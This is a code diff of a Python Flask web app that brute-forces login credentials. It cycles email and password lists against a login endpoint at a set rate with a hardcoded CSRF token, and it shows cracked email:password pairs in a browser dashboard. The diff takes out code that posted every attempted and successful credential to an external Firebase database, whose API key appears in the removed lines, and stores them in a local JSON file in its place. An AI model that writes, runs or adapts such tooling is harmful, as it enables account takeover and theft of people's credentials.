@@ -7,8 +7,6 @@ from urllib.parse import urlparse, quote
 from flask import Flask, Response, request, jsonify
 import threading
 import time
-import requests  # For Firebase API calls
-import datetime
 
 # =======================
 # Config
@@ -18,11 +16,8 @@ proxychoice = "no"                     # "yes" = use 127.0.0.1:8080, "no" = dire
 proxy_url = "http://127.0.0.1:8080"
 emails_file = "emails.txt"
 passwords_file = "passwords.txt"
+log_file = "log.json"
 rate_limit = 20  # requests per second
-
-# Firebase Configuration
-FIREBASE_API_KEY = "AIzaSyB52g3Ncxw5uMKI2PQrD9lje7Yfppb00WY"
-FIREBASE_DB_URL = "https://logfile-8349f-default-rtdb.asia-southeast1.firebasedatabase.app"
 # =======================
 
 # Hardcoded values from the working template
@@ -40,95 +35,48 @@ browser_output_count = 0  # Counter for browser output
 # Flask app
 app = Flask(__name__)
 
-# Firebase functions
-def firebase_get(path):
-    """Get data from Firebase"""
-    try:
-        url = f"{FIREBASE_DB_URL}/{path}.json"
-        response = requests.get(url)
-        return response.json() if response.status_code == 200 else None
-    except Exception as e:
-        print(f"Firebase GET error: {e}")
-        return None
-
-def firebase_post(path, data):
-    """Post data to Firebase (append to list)"""
-    try:
-        url = f"{FIREBASE_DB_URL}/{path}.json"
-        response = requests.post(url, json=data)
-        return response.json()['name'] if response.status_code == 200 else None
-    except Exception as e:
-        print(f"Firebase POST error: {e}")
-        return None
-
-def firebase_put(path, data):
-    """Put data to Firebase"""
-    try:
-        url = f"{FIREBASE_DB_URL}/{path}.json"
-        response = requests.put(url, json=data)
-        return response.status_code == 200
-    except Exception as e:
-        print(f"Firebase PUT error: {e}")
-        return False
-
-def log_event(event_type, email, password, status, response_text=""):
-    """Log an event to Firebase in the same format as your working code"""
-    timestamp = datetime.datetime.utcnow().isoformat()
-    combination = f"{email}:{password}"
-    
-    log_entry = {
-        "timestamp": timestamp,
-        "event": f"[{event_type}] {combination} {status}",
-        "user": "brute_force_app"
-    }
-    
-    if response_text:
-        log_entry["response"] = response_text[:100]  # Limit response length
-    
-    # Save to logs path (as in your working example)
-    firebase_post("logs", log_entry)
-    
-    # Also save to attempted/successful paths for progress tracking
-    if event_type == "SUCCESS":
-        success_entry = {
-            "timestamp": timestamp,
-            "combination": combination,
-            "email": email,
-            "password": password
-        }
-        firebase_post("successful_attempts", success_entry)
-    
-    # Always add to attempted combinations
-    attempted_data = firebase_get("attempted_combinations") or []
-    if combination not in attempted_data:
-        attempted_data.append(combination)
-        firebase_put("attempted_combinations", attempted_data)
-
-
 # Progress log management
 def load_progress():
-    """Load progress from Firebase"""
     progress_data = {
         "attempted_combinations": set(),
         "successful_combinations": []
     }
     
-    # Load attempted combinations
-    attempted_data = firebase_get("attempted_combinations")
-    if attempted_data:
-        progress_data["attempted_combinations"] = set(attempted_data)
-    
-    # Load successful combinations
-    successful_data = firebase_get("successful_attempts")
-    if successful_data:
-        # Convert Firebase object to list of values
-        successful_list = []
-        for key, value in successful_data.items():
-            if isinstance(value, dict):
-                successful_list.append(value)
-        progress_data["successful_combinations"] = successful_list
-    
+    if os.path.exists(log_file):
+        try:
+            with open(log_file, "r") as f:
+                data = json.load(f)
+                progress_data["attempted_combinations"] = set(data.get("attempted_combinations", []))
+                progress_data["successful_combinations"] = data.get("successful_combinations", [])
+        except:
+            # If file is corrupted, start fresh
+            pass
+            
     return progress_data
+
+
+def save_progress(email, password, success=False):
+    progress_data = load_progress()
+    combination = f"{email}:{password}"
+    
+    # Add to attempted combinations
+    progress_data["attempted_combinations"].add(combination)
+    
+    # If successful, add to successful list
+    if success and combination not in [s["combination"] for s in progress_data["successful_combinations"]]:
+        progress_data["successful_combinations"].append({
+            "combination": combination,
+            "email": email,
+            "password": password,
+            "timestamp": time.time()
+        })
+    
+    # Save to file
+    with open(log_file, "w") as f:
+        json.dump({
+            "attempted_combinations": list(progress_data["attempted_combinations"]),
+            "successful_combinations": progress_data["successful_combinations"]
+        }, f, indent=2)
 
 
 async def send_event(msg: str):
@@ -148,7 +96,6 @@ async def brute_email(session, sem, email, passwords, progress_data):
         # Check if we should stop
         if not brute_force_running:
             await send_event(f"[STOPPED] {email}:{pwd}")
-            log_event("STOPPED", email, pwd, "Stopped by user")
             return
             
         # Skip if already attempted
@@ -194,19 +141,18 @@ async def brute_email(session, sem, email, passwords, progress_data):
                 
                 if status == 200:
                     await send_event(f"[SUCCESS] {email}:{pwd}")
-                    log_event("SUCCESS", email, pwd, "Authentication successful")
+                    save_progress(email, pwd, success=True)
                     successful_attempts.append(f"{email}:{pwd}")
                 elif status == 401:
                     await send_event(f"[FAIL] {email}:{pwd}")
-                    log_event("FAIL", email, pwd, "Authentication failed")
+                    save_progress(email, pwd, success=False)
                 else:
                     await send_event(f"[INTERESTING {status}] {email}:{pwd} - Response: {response_text[:100]}")
-                    log_event(f"INTERESTING {status}", email, pwd, "Unexpected response", response_text)
+                    save_progress(email, pwd, success=False)
                     
         except Exception as e:
-            error_msg = str(e)
-            await send_event(f"[ERROR] {email}:{pwd} -> {error_msg}")
-            log_event("ERROR", email, pwd, f"Exception: {error_msg}")
+            await send_event(f"[ERROR] {email}:{pwd} -> {e}")
+            save_progress(email, pwd, success=False)
         finally:
             await asyncio.sleep(1 / rate_limit)
             sem.release()
@@ -217,19 +163,14 @@ async def brute_main():
     global brute_force_running, brute_force_tasks, browser_output_count
     brute_force_running = True
     
-    # Log start event
-    log_event("INFO", "system", "system", "Brute force attack started")
-    
     # Load inputs
     if not os.path.exists(emails_file):
         await send_event(f"[ERROR] Emails file '{emails_file}' not found")
-        log_event("ERROR", "system", "system", f"Emails file '{emails_file}' not found")
         brute_force_running = False
         return
         
     if not os.path.exists(passwords_file):
         await send_event(f"[ERROR] Passwords file '{passwords_file}' not found")
-        log_event("ERROR", "system", "system", f"Passwords file '{passwords_file}' not found")
         brute_force_running = False
         return
         
@@ -247,7 +188,6 @@ async def brute_main():
     
     if remaining <= 0:
         await send_event("[INFO] All combinations already attempted.")
-        log_event("INFO", "system", "system", "All combinations already attempted")
         brute_force_running = False
         return
 
@@ -255,10 +195,6 @@ async def brute_main():
     await send_event(f"[INFO] Remaining combinations: {remaining}")
     await send_event(f"[INFO] Successful so far: {len(progress_data['successful_combinations'])}")
     await send_event(f"[INFO] Using hardcoded CSRF token: {CSRF_TOKEN}")
-    
-    log_event("INFO", "system", "system", f"Starting attack. Already attempted: {attempted_count}/{total_combinations}")
-    log_event("INFO", "system", "system", f"Remaining combinations: {remaining}")
-    log_event("INFO", "system", "system", f"Successful so far: {len(progress_data['successful_combinations'])}")
 
     sem = asyncio.Semaphore(rate_limit)
     connector = aiohttp.TCPConnector(ssl=False, limit=0)
@@ -275,7 +211,6 @@ async def brute_main():
     
     brute_force_running = False
     await send_event("[INFO] Brute force completed")
-    log_event("INFO", "system", "system", "Brute force completed")
 
 
 # Stop the brute force process
@@ -290,7 +225,6 @@ async def stop_brute():
     
     brute_force_tasks = []
     await send_event("[INFO] Brute force stopped by user")
-    log_event("INFO", "system", "system", "Brute force stopped by user")
 
 
 def run_async_task(coro):
@@ -308,8 +242,8 @@ def run_async_task(coro):
 def index():
     # Load successful attempts for display
     progress_data = load_progress()
-    success_count = len(progress_data["successful_combinations"])
     success_list = "\n".join([f"<li>{s['combination']}</li>" for s in progress_data["successful_combinations"]])
+    success_count = len(progress_data["successful_combinations"])
     
     return f"""
 <!DOCTYPE html>
@@ -346,7 +280,7 @@ def index():
     </div>
     
     <div class="success">
-      <h3>Successful Attempts (<span id="success-count">{success_count}</span>)</h3>
+      <h3>Successful Attempts ({success_count})</h3>
       <ul id="success-list">
         {success_list}
       </ul>
@@ -356,15 +290,9 @@ def index():
   <script>
     const out = document.getElementById('out');
     const successList = document.getElementById('success-list');
-    const successCount = document.getElementById('success-count');
     let eventSource = null;
     let outputCount = 0;
     const MAX_OUTPUT_LINES = 60;
-    
-    // Function to auto-scroll an element to the bottom
-    function autoScroll(element) {{
-      element.scrollTop = element.scrollHeight;
-    }}
     
     function startBrute() {{
       // Stop any existing connection
@@ -384,10 +312,8 @@ def index():
         }}
         
         out.textContent += data + "\\n";
+        out.scrollTop = out.scrollHeight;
         outputCount++;
-        
-        // Auto-scroll the output container
-        autoScroll(out.parentElement);
         
         // If it's a success, add to the success list
         if (data.includes('[SUCCESS]')) {{
@@ -395,12 +321,6 @@ def index():
           const li = document.createElement('li');
           li.textContent = combination;
           successList.appendChild(li);
-          
-          // Update success count
-          successCount.textContent = parseInt(successCount.textContent) + 1;
-          
-          // Auto-scroll the success container
-          autoScroll(successList.parentElement);
         }}
       }};
     }}
@@ -422,10 +342,6 @@ def index():
             startBrute();
           }}
         }});
-        
-      // Auto-scroll both containers on page load
-      autoScroll(out.parentElement);
-      autoScroll(successList.parentElement);
     }};
   </script>
 </body>
@@ -480,6 +396,7 @@ def status():
 
 
 if __name__ == "__main__":
+    # Use a random port for security
     port = 5500
     print(f"Starting Flask app on port {port}")
     app.run(host='0.0.0.0', port=port, debug=False)
